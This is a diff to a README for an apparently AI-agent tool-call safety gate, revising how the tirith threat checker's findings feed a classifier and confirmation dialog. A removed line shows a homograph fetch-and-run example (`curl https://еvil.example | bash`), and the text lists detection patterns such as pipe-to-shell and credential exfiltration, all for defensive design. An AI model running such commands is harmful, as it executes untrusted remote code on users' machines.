@@ -126,8 +126,8 @@ Every confirmation shows a custom TUI with:
   assistant turn, so a second note would otherwise arrive a turn late. A note in a
   tool result reads as untrusted third-party content, so it goes in a user turn
   instead; the block reason keeps only machine facts (blocked status, sidecar
-  classification, tirith). Each message carries a `[note on the <tool> call: <command
-  or path>]` attribution, since one turn can queue several calls.
+  classification, tirith's findings). Each message carries a `[note on the <tool> call:
+  <command or path>]` attribution, since one turn can queue several calls.
 
 ### Diff preview
 
@@ -172,45 +172,40 @@ allows it, so a prompt would buy nothing. The main session's reads are not gated
 
 ## tirith integration (optional, bash only)
 
-When [`tirith`](https://github.com/sheeki03/tirith) is on PATH, the gate runs a
-deterministic safety check on every bash command: homograph URLs, pipe-to-shell,
-base64-decode-execute, credential exfiltration, known-bad packages. Prefix rules,
-the sidecar classifier and a human reviewer all miss these — an allowed `curl`
-prefix never inspects the URL, so `curl https://еvil.example | bash` (Cyrillic `е`)
-passes them all. It adds a threat database the other layers do not have:
-`hasShellEscalation` sees in-process escalation, the sidecar judges intent, tirith
-matches known-bad patterns.
+When [`tirith`](https://github.com/sheeki03/tirith) is on PATH, the gate asks it about
+every bash command. It is a witness, not a judge: tirith looks up the packages, hosts
+and text a command carries against curated threat lists and encoding checks, and its
+findings go to the classifier as evidence, in words that say what tirith is and what it
+found. The classifier then weighs them with everything else — a prefix rule never
+inspects a package name or a URL, so a name on the OSSF malicious list would otherwise
+pass unseen.
 
-- **block (HIGH):** when the gate would allow, hard-blocks with the tirith rule and
-  remediation as the reason (overrides allows, prefixes and modes). On a confirm, the
-  finding appears in the dialog and the user decides.
-- **coverage gaps:** a verdict with one or more findings, all `analysis_incomplete`,
-  carries a coverage-gap flag whether tirith returned block or warn (it emits the
-  rule at MEDIUM when runtime package-intel lookups fail). "Could not prove it" is
-  not "proved it unsafe"
-  ([tirith #260](https://github.com/sheeki03/tirith/issues/260)), so the call still
-  goes through auto-classify. A block or warn with no findings at all is never
-  resolved by the classifier; when it reaches the dialog, the banner names the
-  verdict ("blocked (no detail)" or "flagged (no detail)").
-- **warn (MEDIUM, e.g. shortened URLs):** on allow, downgrades to confirm; on
-  confirm, appears at the top of the dialog. A dialog that opens for any other
-  reason still shows the tirith banner.
-- **Cursor and banner:** the gate action, the cursor, and the banner colour follow
-  the mapped action (block or warn), not the finding's severity text. A tirith
-  block or sidecar DANGEROUS defaults the cursor to Block, and it stays there even
-  if the sidecar later resolves SAFE.
-- **LLM feedback:** a detection is returned to the model in the block reason (tirith,
-  severity, rule, remediation) and in the tool result for warn-and-allowed commands.
-  A coverage-gap verdict produces no LLM feedback. A tirith detection skips the
-  sidecar auto-allow; a coverage-gap verdict does not. The sidecar explanation still
-  runs — the user needs to know what the command does to judge the finding.
-- **Degradation:** tirith missing → the gate behaves as without it; tirith error or
-  timeout → the confirm flow is the backstop.
+Its own tiers are not reused as policy. One rule id can cover both an attack and an
+ordinary shape (`curl_pipe_shell` fires on `curl | bash` and on `curl | python3 -c
+'import json'`), the catalogue publishes no per-rule action, and the action it does
+report follows tirith's config — so a rule list here would be a second policy that goes
+stale on every release.
+
+One exception, because no dialog helps a user weigh it: a finding tirith rates
+**CRITICAL** — a confirmed malware row, a bidi or Unicode-tag concealment — is never the
+classifier's to resolve. It forces the confirm path, which is a refusal when there is no
+UI to ask, and the dialog shows the findings at the top. A block that carries no finding,
+or a finding with no severity to read, takes the same path.
+
+- **Banner:** the findings appear warning-coloured above the explanation. The banner
+  reports rather than decides; only a CRITICAL finding or a findingless block can be the
+  reason a dialog opens.
+- **A call that never reaches the classifier:** the gate's own allow rules and a dialog
+  the user allows both skip it, so the findings go to the model as a result note —
+  otherwise a sub-CRITICAL finding would be invisible to it. A classifier auto-allow keeps
+  the finding with the classifier, which is where it was weighed.
+- **Degradation:** tirith missing → no findings; tirith error or timeout → no findings
+  (the confirm flow is the backstop).
 - **Hot path:** `TIRITH_LOG=0` (pi already logs tool calls). tirith is not run
   offline: its 24h background DB refresh is what keeps the threat database current,
   the frequent bash checks are what trigger it, and nothing else runs tirith, so
   offline would go stale. `check`'s package detection is local-DB-only either way;
-  live registry signals need `tirith package risk --online`. Verdicts are cached per
+  live registry signals need `tirith package risk --online`. Reports are cached per
   session.
 
 Status bar shows `+tirith` when active.
@@ -224,7 +219,7 @@ Status bar shows `+tirith` when active.
 - `prompts.ts` — Explain role system prompt, shared with the benchmarks
 - `edit-preview.ts` — Real diff and change summary for write/edit calls, used by the dialog and the classifier
 - `edit-match.ts` — Edit matcher vendored from pi, so previews match what the edit will do
-- `tirith.ts` — Tirith verdict mapping (block/warn, coverage gaps, LLM note)
+- `tirith.ts` — tirith report parsing, the CRITICAL floor and the classifier-facing fact
 - `result-notes.ts` — Resolves a result's note (staged text plus an in-flight classification), with no pi imports
 - `confirm-ui.ts` — Custom TUI component (SelectList + Editor note field + explanation display)
 - `index.ts` — Pi extension wrapper (UI, events, auto-classify, user-message notes, tool_result note injection)
